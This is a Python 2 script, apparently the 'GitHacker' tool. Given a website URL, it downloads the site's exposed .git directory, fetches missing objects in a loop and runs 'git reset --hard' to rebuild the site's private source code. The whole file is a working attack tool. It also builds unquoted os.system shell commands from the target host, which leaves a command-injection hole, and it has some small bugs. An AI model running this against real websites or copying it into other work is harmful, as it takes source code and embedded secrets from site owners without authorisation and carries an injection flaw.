#!/usr/bin/env python
# encoding:utf-8

import os
import requests
import sys

def dirlist(path, allfile):
    filelist =  os.listdir(path)
    for filename in filelist:
        filepath = os.path.join(path, filename)
        if os.path.isdir(filepath):
            dirlist(filepath, allfile)
        else:
            allfile.append(filepath)
    return allfile

def downloadFile(url, path):
    index = path[::-1].find("/")
    folder = path[0:-index]
    try:
        print "[+] Make dir : %s" % (folder)
        os.makedirs(folder)
    except:
        print "[-] Folder already existed!"
    print "[!] Getting -> %s" % (url)
    response = requests.get(url)
    if response.status_code == 200:
        with open(path, "wb") as f:
            print response.content
            f.write(response.content)
            print "[+] Success!"
    else:
        print "[-] [%d]" % (response.status_code)


def fixmissing(temppath):
    # get missing files
    os.system("cd ./%s ; git fsck --name-objects > ../cache.dat" % temppath)
    missing = []
    with open("./cache.dat", "r") as f:
        for line in f:
            missing.append(line.split(" (")[0].split(" ")[-1])

    length = len(missing)
    # clean cache file
    os.system("rm ./cache.dat")

    # download missing files
    for i in missing:
        path = "./%s/.git/objects/%s/%s" % (temppath, i[0:2], i[2:])
        url = "http://%s/.git/objects/%s/%s" % (temppath, i[0:2], i[2:])
        downloadFile(url, path)
    if length > 1:
        fixmissing(temppath)
    else:
        return



def main():
    if len(sys.argv) != 2:
        print "Usage : "
        print "        python GitHacker.py [Website]"
        print "Example : "
        print "        python Githack.py http://127.0.0.1/"
        print "Author : "
        print "        wangyihang <wangyihanger@gmail.com>"
        exit(1)
    files = dirlist("./", [])
    baseurl = sys.argv[1]
    print baseurl
    temppath = baseurl.split("http://")[1].split("/")[0]

    # download base files
    for i in files:
        if i.startswith("./.git"):
            path = "./%s/%s" % (temppath, i[2:])
            url = baseurl + i[2:]
            downloadFile(url, path)



    # download baseobject files
    master = open("./%s/.git/logs/refs/heads/master" % temppath, "r")
    print "[!] Downloading object files"
    for line in master:
        prehash = line.split(" ")[0]
        nexthash = line.split(" ")[1]
        path = "./%s/.git/objects/%s/%s" % (temppath, nexthash[0:2], nexthash[2:])
        url = "http://%s/.git/objects/%s/%s" % (temppath, nexthash[0:2], nexthash[2:])
        try:
            os.makedirs("./%s/%s", (temppath, path))
        except:
            print "[-] Folder already existed!"
        downloadFile(url, path)

    # download missing files
    fixmissing(temppath)

    # git reset to the last commit
    os.system("cd ./%s; git reset --hard;" % temppath)

if __name__ == "__main__":
    main()
